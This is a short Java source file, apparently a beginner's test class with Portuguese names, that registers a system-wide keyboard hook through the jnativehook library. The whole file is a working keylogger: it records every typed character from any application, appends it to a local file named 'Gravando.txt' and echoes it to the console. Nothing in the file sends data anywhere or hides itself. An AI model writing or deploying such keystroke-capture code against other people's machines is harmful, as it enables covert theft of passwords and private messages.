

import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
	public class Teste  implements NativeKeyListener {
		FileWriter escrita;
	
	    public void escrita(char x) throws Exception{
	    escrita = new FileWriter("Gravando.txt",true);
	    escrita.append(x);
		escrita.close();
	     }
		@Override
		public void nativeKeyPressed(NativeKeyEvent e) {
			//System.out.println(e.getKeyChar());
		}
		@Override
		public void nativeKeyReleased(NativeKeyEvent e) {
			// TODO Auto-generated method stub
			//System.out.println(e.getKeyChar());	
		}

		@Override
		public void nativeKeyTyped(NativeKeyEvent e) {
			// TODO Auto-generated method stub
			try {
				escrita(e.getKeyChar());
				
			} catch (Exception e1) {
				
				e1.printStackTrace();
			}
			System.out.println(e.getKeyChar());
			
			
		}
	    
	    public static void main(String args[]) throws Exception {
	    	
	    	try {
				GlobalScreen.registerNativeHook();
			} catch (NativeHookException ex) {
				System.err
						.println("There was a problem registering the native hook.");
				System.err.println(ex.getMessage());

				System.exit(1);
			}

	    	GlobalScreen.getInstance().addNativeKeyListener(
					new Teste());
		}
	

	    }

		
	